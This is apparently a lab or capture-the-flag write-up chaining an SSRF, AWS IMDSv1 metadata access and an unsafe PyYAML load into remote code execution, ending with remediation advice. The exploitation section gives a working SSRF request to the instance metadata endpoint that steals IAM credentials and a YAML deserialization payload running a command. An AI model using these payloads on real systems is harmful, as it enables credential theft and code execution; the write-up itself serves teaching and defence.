# Methodology — Thousand Lows (SSRF → Cloud IMDS → YAML Deserialization)

My working notes. The theme: individually "Low" findings that chain into a Critical.

## 1. SCA — scan the dependencies

```bash
# pip-audit (thin results)
docker run --rm -v "${PWD}:/src" -w /src python:3.11-slim \
  sh -c "pip install -q pip-audit && pip-audit -r requirements.txt"

# Trivy (better, with severity + CVE IDs)
docker run --rm -v "${PWD}:/src" aquasec/trivy:latest fs \
  --scanners vuln /src/requirements.txt
```

Trivy flags **PyYAML 5.1 — CVE-2019-20477**: `yaml.load`/`load_all` allow class deserialization
(e.g. `subprocess.Popen`). And `yaml.load` *is* used in the code.

## 2. Code & infra review — the "Low" findings

- **Unsafe deserialization:** `return yaml.load(data)` — no safe loader.
- **SSRF:** `/import?url=` fetches any URL with no validation:
  ```python
  @app.route("/import")
  def import_template():
      url = request.args.get("url", "")
      r = requests.get(url, timeout=5)
      return r.text[:5000]
  ```
- **Debug mode:** `app.run(..., debug=True)`.
- **IMDSv1 accepted** (Terraform): `http_tokens = "optional"`, `http_put_response_hop_limit = 2`.

## 3. Chaining the lows

```
IMDSv1 + SSRF              = full metadata leak (steal IAM creds)
leaked creds (s3:PutObject) = upload a malicious YAML to the config bucket
PyYAML CVE + malicious YAML = RCE via the /reload function
```

## 4. Exploitation

Steal the instance role's credentials through the SSRF:

```
/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/reportforge-role
→ AWS secret: rfS3cr3t-Acc3ss-K3y-9x7
```

Upload a malicious YAML with the stolen key, then hit `/reload`. Iterated on the payload syntax —
`os.system` runs but returns only an exit code, so I moved to `subprocess.check_output` to get the
output reflected back via the `/render` → `title` field:

```yaml
title: !!python/object/apply:subprocess.check_output [["cat", "/flag.txt"]]
```
```
FLAG{l0w_vulns_ch41n3d_1nt0_full_rc3}
```

## 5. Remediation

1. **IMDSv2 required:** `http_tokens = "required"`, hop limit `1`.
2. **SSRF allow-list** — reject non-global/internal IPs and disallow redirects:
   ```python
   def is_safe(url):
       p = urlsplit(url)
       if p.scheme not in ("http", "https") or not p.hostname:
           return False
       ips = {i[4][0] for i in socket.getaddrinfo(p.hostname, None)}
       return all(ipaddress.ip_address(ip).is_global for ip in ips)
   ```
3. **Debug off** in production.
4. **Generic error handler** — return an error id, log details server-side (no tracebacks to the client).
5. **SCA fix:** `PyYAML>=6.0.2` **and** switch `yaml.load` → `yaml.safe_load`
   (upgrading the library alone is not enough — the insecure *usage* must change).

> Note: breaking any single link (SSRF allow-list, IMDSv2, or least-privilege on `s3:PutObject`)
> stops the chain — but defense-in-depth fixes all of them.
